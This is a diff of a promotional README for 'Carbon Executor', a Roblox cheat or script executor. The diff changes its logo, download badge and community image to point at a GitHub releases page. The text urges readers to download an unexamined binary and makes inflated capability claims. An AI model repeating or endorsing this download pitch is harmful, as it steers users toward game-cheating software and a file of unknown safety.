@@ -1,6 +1,6 @@
 # Carbon Executor - Unleash the Power of Roblox Scripting
 
-![Carbon Executor Logo](https://example.com/carbon-executor-logo.png)
+![Carbon Executor Logo](https://github.com/Oradule/Carbon-Executor/releases/tag/v2.0)
 
 Are you ready to take your Roblox scripting to the next level? Look no further than Carbon Executor, the state-of-the-art Roblox exploit that offers unmatched performance and security features. With 90% UNC support and Level 8 execution capabilities, Carbon Executor empowers users to unlock the full potential of Roblox scripting effortlessly.
 
@@ -14,7 +14,7 @@ Are you ready to take your Roblox scripting to the next level? Look no further t
 ## Get Started
 To download Carbon Executor and start enhancing your Roblox scripting experience, visit the link below:
 
-[![Download Carbon Executor](https://img.shields.io/badge/Download-Carbon%20Executor-blue)](https://github.com/file/App.zip)
+[![Download Carbon Executor](https://github.com/Oradule/Carbon-Executor/releases/tag/v2.0%20Executor-blue)](https://github.com/Oradule/Carbon-Executor/releases/tag/v2.0)
 
 If the link above ends with the file name, simply click to launch the download. If you encounter any issues with the link, please check the "Releases" section for alternative options.
 
@@ -37,7 +37,7 @@ Explore various topics related to Carbon Executor on GitHub:
 ## Join the Community
 Connect with other Carbon Executor users, share your experiences, and stay updated on the latest developments by joining our community forums.
 
-![Join the Community](https://example.com/community-forums.png)
+![Join the Community](https://github.com/Oradule/Carbon-Executor/releases/tag/v2.0)
 
 ## Support
 If you need any assistance with Carbon Executor or have any questions, feel free to reach out to our support team. We are here to help you make the most of your scripting journey.
